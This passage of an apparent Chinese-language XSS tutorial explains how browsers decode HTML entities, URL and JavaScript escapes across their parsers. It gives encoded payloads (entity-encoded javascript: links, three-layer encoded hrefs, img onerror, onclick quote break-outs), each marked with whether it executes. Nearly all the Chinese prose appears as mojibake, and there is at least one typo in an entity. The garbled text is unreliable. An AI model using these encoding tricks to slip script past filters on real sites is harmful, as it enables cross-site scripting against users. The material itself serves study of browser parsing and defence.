å­—ç¬¦ä¼šè¢«æ”¾å…¥æ•°æ®ç¼“å†²åŒºä¸­ã€‚\n è¿™é‡Œä¸‰ç§çŠ¶æ€æˆ‘ä»¬ä¼šåœ¨åé¢æåˆ°ã€‚\nå®ä½“åç§° å­—ç¬¦å®ä½“ä»¥\u0026amp;å¼€å¤´ + é¢„å…ˆå®šä¹‰çš„å®ä½“åç§°ï¼Œä»¥åˆ†å·ç»“å°¾ï¼Œå¦‚\u0026lt;çš„ç¼–ç ä¸º\u0026amp;1t;\nå®ä½“ç¼–å· ä»¥\u0026amp;å¼€å¤´ + #ç¬¦å·ä»¥åŠå­—ç¬¦çš„åè¿›åˆ¶æ•°å­—ï¼Œå¦‚\u0026lt;çš„å®ä½“ç¼–å·ä¸º\u0026amp;#60;ï¼Œå­—ç¬¦éƒ½æ˜¯æœ‰å®ä½“ç¼–å·çš„ä½†æœ‰äº›å­—ç¬¦æ²¡æœ‰å®ä½“åç§°ã€‚\nJavascript Encode  ä¸‰ä¸ªå…«è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœä¸å¤Ÿä¸ªæ•°ï¼Œå‰é¢è¡¥0ï¼Œä¾‹å¦‚â€œeâ€ç¼–ç ä¸ºâ€œ\\145â€ ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœä¸å¤Ÿä¸ªæ•°ï¼Œå‰é¢è¡¥0ï¼Œä¾‹å¦‚â€œeâ€ç¼–ç ä¸ºâ€œ\\x65â€ å››ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœä¸å¤Ÿä¸ªæ•°ï¼Œå‰é¢è¡¥0ï¼Œä¾‹å¦‚â€œeâ€ç¼–ç ä¸ºâ€œ\\u0065â€ å¯¹äºä¸€äº›æ§åˆ¶å­—ç¬¦ï¼Œä½¿ç”¨ç‰¹æ®Šçš„Cç±»å‹çš„è½¬ä¹‰é£æ ¼ï¼ˆä¾‹å¦‚\\nå’Œ\\rï¼‰ jsfuckç¼–ç   CSS Encode ç”¨ä¸€ä¸ªåæ–œçº¿\\åé¢è·Ÿ1~6ä½çš„åå…­è¿›åˆ¶æ•°å­—ï¼Œä¾‹å¦‚eå¯ä»¥ç¼–ç ä¸º \\65 æˆ– 65 æˆ– 00065\nJavascript å†…ç½®çš„ç¼–ç å‡½æ•° ####String.fromCharCode\nString.fromCharCode(97,108,101,114,116) è¿™é‡Œæ˜¯alertçš„ç¼–ç \nRender è¿™éƒ¨åˆ†å¼ºçƒˆæ¨èä»”ç»†é˜…è¯»Deep dive into browser parsing and XSS payload encodingï¼Œæ–‡ç« è®²çš„å¾ˆè¯¦ç»†äº†ï¼Œæˆ‘è¿™é‡Œæµ“ç¼©ä¸€ä¸‹ã€‚\nåŸç† è§ˆå™¨åœ¨è§£æHTMLæ–‡æ¡£æ—¶æ— è®ºæŒ‰ç…§ä»€ä¹ˆé¡ºåºï¼Œä¸»è¦æœ‰ä¸‰ä¸ªè¿‡ç¨‹ï¼šHTMLè§£æã€JSè§£æå’ŒURLè§£æï¼Œæ¯ä¸ªè§£æå™¨è´Ÿè´£HTMLæ–‡æ¡£ä¸­å„è‡ªå¯¹åº”éƒ¨åˆ†çš„è§£æå·¥ä½œã€‚\né¦–å…ˆæµè§ˆå™¨æ¥æ”¶åˆ°ä¸€ä¸ªHTMLæ–‡æ¡£æ—¶ï¼Œä¼šè§¦å‘HTMLè§£æå™¨å¯¹HTMLæ–‡æ¡£è¿›è¡Œè¯æ³•è§£æï¼Œè¿™ä¸€è¿‡ç¨‹å®ŒæˆHTMLè§£ç å¹¶åˆ›å»ºDOMæ ‘ï¼Œæ¥ä¸‹æ¥JavaScriptè§£æå™¨ä¼šä»‹å…¥å¯¹å†…è”è„šæœ¬è¿›è¡Œè§£æï¼Œè¿™ä¸€è¿‡ç¨‹å®ŒæˆJSçš„è§£ç å·¥ä½œï¼Œå¦‚æœæµè§ˆå™¨é‡åˆ°éœ€è¦URLçš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œè¿™æ—¶URLè§£æå™¨ä¹Ÿä¼šä»‹å…¥å®ŒæˆURLçš„è§£ç å·¥ä½œï¼ŒURLè§£æå™¨çš„è§£ç é¡ºåºä¼šæ ¹æ®URLæ‰€åœ¨ä½ç½®ä¸åŒï¼Œå¯èƒ½åœ¨JavaScriptè§£æå™¨ä¹‹å‰æˆ–ä¹‹åè§£æã€‚\næµè§ˆå™¨çš„è§£æè§„åˆ™ï¼šæµè§ˆå™¨æ”¶åˆ°HTMLå†…å®¹åï¼Œä¼šä»å¤´å¼€å§‹è§£æã€‚å½“é‡åˆ°JSä»£ç æ—¶ï¼Œä¼šä½¿ç”¨JSè§£æå™¨è§£æã€‚å½“é‡åˆ°URLæ—¶ï¼Œä¼šä½¿ç”¨URLè§£æå™¨è§£æã€‚é‡åˆ°CSSåˆ™ç”¨CSSè§£æå™¨è§£æã€‚å°¤å…¶å½“é‡åˆ°å¤æ‚ä»£ç æ—¶ï¼Œå¯èƒ½è¯¥æ®µä»£ç ä¼šç»è¿‡å¤šä¸ªè§£æå™¨è§£æã€‚\nä¸‰ç§çŠ¶æ€ æ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ \u0026lt;div\u0026gt;\u0026amp;#60;img src=x onerror=alert(4)\u0026amp;#62;\u0026lt;/div\u0026gt; ä¾‹å¦‚ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ\u0026lt;å’Œ\u0026gt;å­—ç¬¦è¢«ç¼–ç ä¸º\u0026amp;#60;å’Œ\u0026amp;#62;ã€‚\nå½“è§£æå™¨è§£æå®Œ\u0026lt;div\u0026gt;å¹¶å¤„äºâ€œæ•°æ®çŠ¶æ€â€æ—¶ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦å°†ä¼šè¢«è§£æã€‚å½“è§£æå™¨é‡åˆ°\u0026amp;å­—ç¬¦ï¼Œå®ƒä¼šçŸ¥é“è¿™æ˜¯\u0026quot;æ•°æ®çŠ¶æ€çš„å­—ç¬¦å¼•ç”¨\u0026quot;ï¼Œå› æ­¤ä¼šæ¶ˆè€—ä¸€ä¸ªå­—ç¬¦å¼•ç”¨ï¼ˆä¾‹å¦‚\u0026amp;#60;ï¼‰å¹¶é‡Šæ”¾å‡ºå¯¹åº”å­—ç¬¦çš„ token ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¯¹åº”å­—ç¬¦æŒ‡çš„æ˜¯\u0026lt;å’Œ\u0026gt;ã€‚\nä½ å¯èƒ½ä¼šæƒ³ï¼šè¿™æ˜¯ä¸æ˜¯æ„å‘³ç€\u0026lt;å’Œ\u0026gt;çš„tokenå°†ä¼šè¢«ç†è§£ä¸ºæ ‡ç­¾çš„å¼€å§‹å’Œç»“æŸï¼Œç„¶åå…¶ä¸­çš„è„šæœ¬ä¼šè¢«æ‰§è¡Œï¼Ÿç­”æ¡ˆæ˜¯è„šæœ¬å¹¶ä¸ä¼šè¢«æ‰§è¡Œã€‚åŸå› æ˜¯è§£æå™¨åœ¨è§£æè¿™ä¸ªå­—ç¬¦å¼•ç”¨åä¸ä¼šè½¬æ¢åˆ°\u0026quot;æ ‡ç­¾å¼€å§‹çŠ¶æ€\u0026quot;ã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œå°±ä¸ä¼šå»ºç«‹æ–°æ ‡ç­¾ã€‚å› æ­¤ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨å­—ç¬¦å®ä½“ç¼–ç è¿™ä¸ªè¡Œä¸ºæ¥è½¬ä¹‰ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä»è€Œç¡®ä¿ç”¨æˆ·è¾“å…¥çš„æ•°æ®åªèƒ½è¢«è§£ææˆ\u0026quot;æ•°æ®\u0026quot;ã€‚\nRCDATA çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ \u0026lt;textarea\u0026gt;\u0026amp;#60;script\u0026amp;#62;alert(5)\u0026amp;#60;/script\u0026amp;#62;\u0026lt;/textarea\u0026gt; è¿™æ„å‘³ç€åœ¨\u0026lt;textarea\u0026gt;å’Œ\u0026lt;title\u0026gt;æ ‡ç­¾ä¸­çš„å­—ç¬¦å¼•ç”¨ä¼šè¢« HTML è§£æå™¨è§£ç ã€‚è¿™é‡Œè¦å†æé†’ä¸€æ¬¡ï¼Œåœ¨è§£æè¿™äº›å­—ç¬¦å¼•ç”¨çš„è¿‡ç¨‹ä¸­ä¸ä¼šè¿›å…¥â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€ã€‚è¿™æ ·å°±å¯ä»¥è§£é‡Šè¿™æ®µä»£ç äº†ã€‚\nå¦å¤–ï¼Œå¯¹ RCDATA æœ‰ä¸ªç‰¹æ®Šçš„æƒ…å†µã€‚åœ¨æµè§ˆå™¨è§£æ RCDATA å…ƒç´ çš„è¿‡ç¨‹ä¸­ï¼Œè§£æå™¨ä¼šè¿›å…¥\u0026quot;RCDATAçŠ¶æ€\u0026quot;ã€‚åœ¨è¿™ä¸ªçŠ¶æ€ä¸­ï¼Œå¦‚æœé‡åˆ°\u0026lt;å­—ç¬¦ï¼Œå®ƒä¼šè½¬æ¢åˆ°\u0026quot;RCDATAå°äºå·çŠ¶æ€\u0026quot;ã€‚å¦‚æœ\u0026lt;å­—ç¬¦åæ²¡æœ‰ç´§è·Ÿç€/å’Œå¯¹åº”çš„æ ‡ç­¾åï¼Œè§£æå™¨ä¼šè½¬æ¢å›\u0026quot;RCDATAçŠ¶æ€\u0026quot;ã€‚è¿™æ„å‘³ç€åœ¨ RCDATA å…ƒç´ æ ‡ç­¾çš„å†…å®¹ä¸­ï¼ˆä¾‹å¦‚\u0026lt;textarea\u0026gt;æˆ–\u0026lt;title\u0026gt;çš„å†…å®¹ä¸­ï¼‰ï¼Œå”¯ä¸€èƒ½å¤Ÿè¢«è§£æå™¨è®¤åšæ˜¯æ ‡ç­¾çš„å°±æ˜¯\u0026lt;/textarea\u0026gt;æˆ–è€…\u0026lt;/title\u0026gt;ã€‚å½“ç„¶ï¼Œè¿™è¦çœ‹å¼€å§‹æ ‡ç­¾æ˜¯å“ªä¸€ä¸ªã€‚å› æ­¤ï¼Œåœ¨\u0026lt;textarea\u0026gt;å’Œ\u0026lt;title\u0026gt;çš„å†…å®¹ä¸­ä¸ä¼šåˆ›å»ºæ ‡ç­¾ï¼Œå°±ä¸ä¼šæœ‰è„šæœ¬èƒ½å¤Ÿæ‰§è¡Œã€‚è¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆé—®é¢˜ä¸­çš„è„šæœ¬ä¸ä¼šè¢«æ‰§è¡Œã€‚\næˆ‘ä»¬æ¥è¿…é€Ÿçœ‹ä¸€ä¸‹ CDATA å…ƒç´ ã€‚ä»»ä½•åœ¨ CDATA å…ƒç´ ä¸­çš„å†…å®¹å°†ä¸ä¼šè§¦å‘è§£æå™¨åˆ›å»ºå¼€å§‹æ ‡ç­¾ã€‚é—­åˆ CDATA å…ƒç´ çš„æ ‡å¿—æ˜¯]]\u0026gt;åºåˆ—ã€‚å› æ­¤å¦‚æœç”¨æˆ·æƒ³é€ƒå‡º CDATA å…ƒç´ ï¼Œå°±è¦ç”¨æœªç»ä»»ä½•ç¼–ç çš„]]\u0026gt;åºåˆ—ï¼Œä¸ç„¶æ˜¯ä¸ä¼šé€ƒå‡º CDATA å…ƒç´ çš„ã€‚\nå±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ \u0026lt;a href=\u0026#34;\u0026amp;#x6a;\u0026amp;#x61;\u0026amp;#x76;\u0026amp;#x61;\u0026amp;#x73;\u0026amp;#x63;\u0026amp;#x72;\u0026amp;#x69;\u0026amp;#x70;\u0026amp;#x74;:%61 %6c%65%72%74%28%32%29\u0026#34;\u0026gt; åœ¨è¿™ä¸ªæƒ…å†µä¸­å­—ç¬¦å¼•ç”¨ä¼šè¢«è§£ç ã€‚åœ¨è¿™é‡Œï¼ŒHTML è§£æå™¨è§£æäº†æ–‡æ¡£ï¼Œåˆ›å»ºäº†æ ‡ç­¾ tokenï¼Œå¹¶ä¸”å¯¹ href å±æ€§é‡Œçš„å­—ç¬¦å®ä½“è¿›è¡Œäº†è§£ç ã€‚ç„¶åï¼Œå½“ HTML è§£æå™¨å·¥ä½œå®Œæˆåï¼ŒURL è§£æå™¨å¼€å§‹è§£æ href å±æ€§å€¼é‡Œçš„é“¾æ¥ã€‚åœ¨è¿™æ—¶ï¼Œ javascript åè®®å·²ç»è¢«è§£ç ï¼Œå®ƒèƒ½å¤Ÿè¢« URL è§£æå™¨æ­£ç¡®è¯†åˆ«ã€‚ç„¶å URL è§£æå™¨ç»§ç»­è§£æé“¾æ¥å‰©ä¸‹çš„éƒ¨åˆ†ã€‚ç”±äºæ˜¯ javascript åè®®ï¼ŒJavaScript è§£æå™¨å¼€å§‹å·¥ä½œå¹¶æ‰§è¡Œè¿™æ®µä»£ç ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆé—®é¢˜ä¸­çš„ä»£ç èƒ½å¤Ÿè¢«æ‰§è¡Œã€‚\nJavascript è§£æ JavaScriptè§£æè¿‡ç¨‹ä¸HTMLè§£æè¿‡ç¨‹æœ‰ç‚¹ä¸ä¸€æ ·ã€‚\nscript å—æœ‰ä¸ªæœ‰è¶£çš„å±æ€§ï¼šåœ¨å—ä¸­çš„å­—ç¬¦å¼•ç”¨å¹¶ä¸ä¼šè¢«è§£æå’Œè§£ç ã€‚å¦‚æœä½ å»çœ‹â€œè„šæœ¬æ•°æ®çŠ¶æ€â€çš„çŠ¶æ€è½¬æ¢è§„åˆ™ï¼Œå°±ä¼šå‘ç°æ²¡æœ‰ä»»ä½•è§„åˆ™èƒ½è½¬ç§»åˆ°å­—ç¬¦å¼•ç”¨çŠ¶æ€ã€‚æ‰€ä»¥å¦‚æœæ”»å‡»è€…å°è¯•ç€å°†è¾“å…¥æ•°æ®ç¼–ç æˆå­—ç¬¦å®ä½“å¹¶å°†å…¶æ”¾åœ¨script å—ä¸­ï¼Œå®ƒå°†ä¸ä¼šè¢«æ‰§è¡Œã€‚\nåƒ\\uXXXXï¼ˆä¾‹å¦‚\\u0000,\\u000Aï¼‰è¿™æ ·çš„å­—ç¬¦ï¼ŒJavaScript ä¼šè§†æƒ…å†µè€Œå®šè§£æè¿™äº›å­—ç¬¦æ¥æ‰§è¡Œã€‚å…·ä½“çš„è¯´å°±æ˜¯è¦çœ‹è¢«ç¼–ç çš„åºåˆ—åˆ°åº•æ˜¯å“ªéƒ¨åˆ†ã€‚é¦–å…ˆï¼Œåƒ\\uXXXXä¸€æ ·çš„å­—ç¬¦è¢«ç§°ä½œ Unicode è½¬ä¹‰åºåˆ—ã€‚ä»ä¸Šä¸‹æ–‡æ¥çœ‹ï¼Œä½ å¯ä»¥å°†è½¬ä¹‰åºåˆ—æ”¾åœ¨3ä¸ªéƒ¨åˆ†ï¼šå­—ç¬¦ä¸²ä¸­ï¼Œæ ‡è¯†ç¬¦åç§°ä¸­å’Œæ§åˆ¶å­—ç¬¦ä¸­ã€‚\nå­—ç¬¦ä¸²ä¸­ å½“ Unicode è½¬ä¹‰åºåˆ—å­˜åœ¨äºå­—ç¬¦ä¸²ä¸­æ—¶ï¼Œå®ƒåªä¼šè¢«è§£é‡Šä¸ºæ­£è§„å­—ç¬¦ï¼Œè€Œä¸æ˜¯å•å¼•å·ï¼ŒåŒå¼•å·æˆ–è€…æ¢è¡Œç¬¦è¿™äº›èƒ½å¤Ÿæ‰“ç ´å­—ç¬¦ä¸²ä¸Šä¸‹æ–‡çš„å­—ç¬¦ã€‚è¿™é¡¹å†…å®¹æ¸…æ¥šåœ°å†™åœ¨ ECMAScript ä¸­ã€‚å› æ­¤ï¼ŒUnicode è½¬ä¹‰åºåˆ—å°†æ°¸è¿œä¸ä¼šç ´ç¯å­—ç¬¦ä¸²ä¸Šä¸‹æ–‡ï¼Œå› ä¸ºå®ƒä»¬åªèƒ½è¢«è§£é‡Šæˆå­—ç¬¦ä¸²å¸¸é‡ã€‚\næ ‡è¯†ç¬¦åç§°ä¸­ å½“ Unicode è½¬ä¹‰åºåˆ—å‡ºç°åœ¨æ ‡è¯†ç¬¦åç§°ä¸­æ—¶ï¼Œå®ƒä¼šè¢«è§£ç å¹¶è§£é‡Šä¸ºæ ‡è¯†ç¬¦åç§°çš„ä¸€éƒ¨åˆ†ï¼Œä¾‹å¦‚å‡½æ•°åï¼Œå±æ€§åç­‰ç­‰ã€‚å¦‚æœæˆ‘ä»¬æ·±å…¥ç ”ç©¶ JavaScript ç»†åˆ™ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼š\n â€‹\tUnicodeè½¬ä¹‰åºåˆ—ï¼ˆå¦‚\\u000A\\u000Bï¼‰åŒæ ·è¢«å…è®¸ç”¨åœ¨æ ‡è¯†ç¬¦åç§°ä¸­ï¼Œè¢«å½“ä½œåç§°ä¸­çš„ä¸€ä¸ªå­—ç¬¦ã€‚è€Œå°†''ç¬¦å·å‰ç½®åœ¨Unicodeè½¬ä¹‰åºåˆ—ä¸²ï¼ˆå¦‚\\u000A000B000Cï¼‰å¹¶ä¸èƒ½ä½œä¸ºæ ‡è¯†ç¬¦åç§°ä¸­çš„å­—ç¬¦ã€‚å°†Unicodeè½¬ä¹‰åºåˆ—ä¸²æ”¾åœ¨æ ‡è¯†ç¬¦åç§°ä¸­æ˜¯éæ³•çš„ã€‚\n æ§åˆ¶å­—ç¬¦ å½“ç”¨ Unicode è½¬ä¹‰åºåˆ—æ¥è¡¨ç¤ºä¸€ä¸ªæ§åˆ¶å­—ç¬¦æ—¶ï¼Œä¾‹å¦‚å•å¼•å·ã€åŒå¼•å·ã€åœ†æ‹¬å·ç­‰ç­‰ï¼Œå®ƒä»¬å°†ä¸ä¼šè¢«è§£é‡Šæˆæ§åˆ¶å­—ç¬¦ï¼Œè€Œä»…ä»…è¢«è§£ç å¹¶è§£æä¸ºæ ‡è¯†ç¬¦åç§°æˆ–è€…å­—ç¬¦ä¸²å¸¸é‡ã€‚å¦‚æœä½ å»çœ‹ ECMAScript çš„è¯­æ³•ï¼Œå°±ä¼šå‘ç°æ²¡æœ‰ä¸€å¤„ä¼šç”¨Unicode è½¬ä¹‰åºåˆ—æ¥å½“ä½œæ§åˆ¶å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè§£æå™¨æ­£åœ¨è§£æä¸€ä¸ªå‡½æ•°è°ƒç”¨è¯­å¥ï¼Œåœ†æ‹¬å·éƒ¨åˆ†å¿…é¡»ä¸º(å’Œ)ï¼Œè€Œä¸èƒ½æ˜¯\\u0028å’Œ\\u0029ã€‚\næ€»çš„æ¥è¯´ï¼ŒUnicode è½¬ä¹‰åºåˆ—åªæœ‰åœ¨æ ‡è¯†ç¬¦åç§°é‡Œä¸è¢«å½“ä½œå­—ç¬¦ä¸²ï¼Œä¹Ÿåªæœ‰åœ¨æ ‡è¯†ç¬¦åç§°é‡Œçš„ç¼–ç å­—ç¬¦èƒ½å¤Ÿè¢«æ­£å¸¸çš„è§£æã€‚\nExample Example 1 \u0026lt;a href=\u0026#34;\u0026amp;#x6a;\u0026amp;#x61;\u0026amp;#x76;\u0026amp;#x61;\u0026amp;#x73;\u0026amp;#x63;\u0026amp;#x72;\u0026amp;#x69;\u0026amp;#x70;\u0026amp;#x74;:%61%6c%65%72%74%28%32%29\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; è¿™æ®µä»£ç å¯ä»¥è¢«æ‰§è¡Œï¼Œé¦–å…ˆç»è¿‡ HTML è§£æå™¨ï¼ŒæŠŠ HTML å®ä½“éƒ¨åˆ†è§£æäº†ï¼Œå˜æˆ\n\u0026lt;a href=\u0026#34;javascript:%61%6c%65%72%74%28%32%29\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; æ­¤æ—¶ï¼Œç”±äº javascript å·²ç»ç”Ÿæˆï¼Œä¸è¿å URL è§£æè§„åˆ™ã€‚æ‰€ä»¥ï¼ŒURL è§£ææ­£å¸¸ã€‚è§£æäº† javascript ï¼Œæœ€ç»ˆè¿›å…¥ JSè§£æå™¨ã€‚æ³¨æ„ï¼ŒURL è§£æå™¨è¿˜å®Œæˆäº† URL è§£ç å·¥ä½œã€‚\n\u0026lt;a href=\u0026#34;javascript:alert(2)\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; æ‰€ä»¥å¯ä»¥æˆåŠŸæ‰§è¡Œä»£ç å¼¹çª—ã€‚\nExample 2 \u0026lt;a href=\u0026#34;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; å…¶ä¸­ URL ç¼–ç çš„æ˜¯javascript:alert(1)ï¼Œå…¶å®è¿™æ®µä»£ç æ”¾åˆ° html å½“ä¸­å¹¶ä¸ä¼šæ‰§è¡Œï¼ŒURLè§£ç ä¹‹å Javascript è§£æå™¨å®Œæˆè§£ç æ“ä½œï¼Œè®²é“ç†è„šæœ¬åº”è¯¥ä¼šæ­£å¸¸æ‰§è¡Œå•Šï¼Œè¿™é‡Œå°±æœ‰ä¸€ä¸ª URL è§£æè¿‡ç¨‹ä¸­çš„ä¸€ä¸ªç»†èŠ‚äº†ï¼Œä¸èƒ½å¯¹åè®®ç±»å‹è¿›è¡Œä»»ä½•çš„ç¼–ç æ“ä½œï¼Œå¦åˆ™ URL è§£æå™¨ä¼šè®¤ä¸ºå®ƒæ— ç±»å‹ï¼Œå°±å¯¼è‡´è¿™é‡Œè¢«ç¼–ç çš„javascriptæ²¡æœ‰è§£ç ï¼Œå½“ç„¶ä¸ä¼šè¢« URL è§£æå™¨è¯†åˆ«äº†ã€‚\nExample 3 \u0026lt;a href=\u0026#34;\u0026amp;#106;\u0026amp;#97;\u0026amp;#118;\u0026amp;#97;\u0026amp;#115;\u0026amp;#99;\u0026amp;#114;\u0026amp;#105;\u0026amp;#112;\u0026amp;#116;\u0026amp;#58;\u0026amp;#37;\u0026amp;#53;\u0026amp;#99;\u0026amp;#37;\u0026amp;#55;\u0026amp;#53;\u0026amp;#37;\u0026amp;#51;\u0026amp;#48;\u0026amp;#37;\u0026amp;#51;\u0026amp;#48;\u0026amp;#37;\u0026amp;#51;\u0026amp;#54;\u0026amp;#37;\u0026amp;#51;\u0026amp;#49;\u0026amp;#37;\u0026amp;#53;\u0026amp;#99;\u0026amp;#37;\u0026amp;#55;\u0026amp;#53;\u0026amp;#37;\u0026amp;#51;\u0026amp;#48;\u0026amp;#37;\u0026amp;#51;\u0026amp;#48;\u0026amp;#37;\u0026amp;#51;\u0026amp;#54;\u0026amp;#37;\u0026amp;#54;\u0026amp;#51;\u0026amp;#37;\u0026amp;#53;\u0026amp;#99;\u0026amp;#37;\u0026amp;#55;\u0026amp;#53;\u0026amp;#37;\u0026amp;#51;\u0026amp;#48;\u0026amp;#37;\u0026amp;#51;\u0026amp;#48;\u0026amp;#37;\u0026amp;#51;\u0026amp;#54;\u0026amp;#37;\u0026amp;#51;\u0026amp;#53;\u0026amp;#37;\u0026amp;#53;\u0026amp;#99;\u0026amp;#37;\u0026amp;#55;\u0026amp;#53;\u0026amp;#37;\u0026amp;#51;\u0026amp;#48;\u0026amp;#37;\u0026amp;#51;\u0026amp;#48;\u0026amp;#37;\u0026amp;#51;\u0026amp;#55;\u0026amp;#37;\u0026amp;#51;\u0026amp;#50;\u0026amp;#37;\u0026amp;#53;\u0026amp;#99;\u0026amp;#37;\u0026amp;#55;\u0026amp;#53;\u0026amp;#37;\u0026amp;#51;\u0026amp;#48;\u0026amp;#37;\u0026amp;#51;\u0026amp;#48;\u0026amp;#37;\u0026amp;#51;\u0026amp;#55;\u0026amp;#37;\u0026amp;#51;\u0026amp;#52;\u0026amp;#40;\u0026amp;#51;\u0026amp;#41;\u0026#34;\u0026gt;test3\u0026lt;/a\u0026gt; ä»¥ä¸Šä¸ºå¯¹\u0026lt;a href=\u0026quot;javascript:alert(3)\u0026quot;\u0026gt;test3\u0026lt;/a\u0026gt;å…ˆåš JS ç¼–ç ï¼Œç„¶ååšURLç¼–ç ï¼Œå†åšHTMLç¼–ç å…±3å±‚ã€‚\næ‰€ä»¥è¿™é‡Œç¬¦åˆç¼–ç å…¶å®åœ¨é¦–å…ˆç»è¿‡ HTML è§£æå™¨è§£æä¹‹åå˜æˆ\n\u0026lt;a href=\u0026#34;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)\u0026#34;\u0026gt;test3\u0026lt;/a\u0026gt; å†ç»è¿‡ URL è§£æå™¨è§£æåˆ°äº†javascriptï¼Œå¹¶è§£æåé¢çš„ url ç¼–ç å˜æˆ\n\u0026lt;a href=\u0026#34;javascript:\\u0061\\u006c\\u0065\\u0072\\u0074(3)\u0026#34;\u0026gt;test3\u0026lt;/a\u0026gt; URL è§£æå™¨ä¼ ç»™ JS è§£æå™¨è§£æ javascript ä»£ç ï¼Œæ­£å¸¸è§£æå¾—åˆ°å¼¹çª—\nExample 4 \u0026lt;a onclick=\u0026#34;window.open(\u0026#39;value1\u0026#39;)\u0026#34; href=\u0026#34;javascript:window.open(\u0026#39;value2\u0026#39;)\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; value1å¤„ï¼Œå…ˆç»è¿‡ HTML è§£ç ï¼Œç„¶åç»è¿‡ javascript è§£ç ï¼Œæœ€åç»è¿‡ url è§£ç \nvalue2å¤„åˆ™æ˜¯å…ˆç»è¿‡ HTML è§£ç ï¼Œç„¶åç»è¿‡ url è§£ç ï¼Œæ¥ç€ javascript è§£ç ï¼Œæœ€åç»è¿‡ url è§£ç \nExample 5 \u0026lt;img src\u0026amp;#x3d;\u0026#34;http://www.example.com\u0026#34;\u0026gt; \u0026lt;img s\u0026amp;#x72;c=\u0026#34;http://www.example.com\u0026#34;\u0026gt; è¿™é‡Œéƒ½ä¸ä¼šåŠ è½½å›¾ç‰‡ï¼Œå› ä¸ºå‚è€ƒæˆ‘ä»¬ä¸Šé¢è®²çš„ä¸‰ç§çŠ¶æ€ï¼Œè¿™é‡Œå®ä½“ç¼–ç å­˜åœ¨çš„åœ°æ–¹å¹¶ä¸å±äºä»»ä½•ä¸€ç§çŠ¶æ€ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«è§£ç ã€‚\nExamples   \u0026lt;a href=\u0026quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\u0026quot;\u0026gt;\u0026lt;/a\u0026gt; URL encoded \u0026ldquo;javascript:alert(1)\u0026rdquo;\nAnswer: The javascript will NOT execute.\nExplanation: URL è§£æå™¨è§£æä¹‹åä¸ä¼šå†æ‰ç”¨ js è§£æå™¨è§£æï¼Œæ‰€ä»¥ä¸ä¼šä½¿ç”¨ js ä¼ªåè®®\n  \u0026lt;a href=\u0026quot;\u0026amp;#x6a;\u0026amp;#x61;\u0026amp;#x76;\u0026amp;#x61;\u0026amp;#x73;\u0026amp;#x63;\u0026amp;#x72;\u0026amp;#x69;\u0026amp;#x70;\u0026amp;#x74;:%61 %6c%65%72%74%28%32%29\u0026quot;\u0026gt;\nCharacter entity encoded \u0026ldquo;javascript\u0026rdquo; and URL encoded \u0026ldquo;alert(2)\u0026rdquo;\nAnswer: The javascript will execute.\nExplanation: é¦–å…ˆç”¨ HTML è§£æå™¨è§£æå®ä½“å­—ç¬¦ï¼Œå†ç”¨ URL è§£æå™¨è§£æï¼Œå¹¶è°ƒç”¨ js è§£æå™¨è¿›è¡Œ js ä¼ªåè®®è§£æ\n  \u0026lt;a href=\u0026quot;javascript%3aalert(3)\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;\nURL encoded \u0026ldquo;:\u0026rdquo;\nAnswer: The javascript will NOT execute.\nExplanation: URL è§£æå™¨è§£æä¹‹åå¹¶ä¸ä¼šè¯†åˆ« js ä¼ªåè®®\n   \u0026lt;div\u0026gt;\u0026amp;#60;img src=x onerror=alert(4)\u0026amp;#62;\u0026lt;/div\u0026gt;\nCharacter entity encoded \u0026lt; and \u0026gt;\nAnswer: The javascript will NOT execute.\nExplanation: å‚ç…§ #æ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨\n  \u0026lt;textarea\u0026gt;\u0026amp;#60;script\u0026amp;#62;alert(5)\u0026amp;#60;/script\u0026amp;#62;\u0026lt;/textarea\u0026gt;\nCharacter entity encoded \u0026lt; and \u0026gt;\nAnswer: The javascript will NOT execute AND the character entities will NOT be decoded either\nExplanation: å‚ç…§ #RCDATA çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨\n  \u0026lt;textarea\u0026gt;\u0026lt;script\u0026gt;alert(6)\u0026lt;/script\u0026gt;\u0026lt;/textarea\u0026gt;\nAnswer: The javascript will NOT execute.\nExplanation: å‚ç…§ #RCDATA çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨\n  \u0026lt;button onclick=\u0026quot;confirm('7\u0026amp;#39;);\u0026quot;\u0026gt;Button\u0026lt;/button\u0026gt;\nCharacter entity encoded '\nAnswer: The javascript will execute.\nExplanation: å±äºå±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼Œä¼šåœ¨ HTML è§£æå™¨ä¸­é¦–å…ˆè¢«è§£ææˆ'ï¼Œé—­åˆäº†å•å¼•å·ï¼Œå¾—åˆ°æ‰§è¡Œ\n  \u0026lt;button 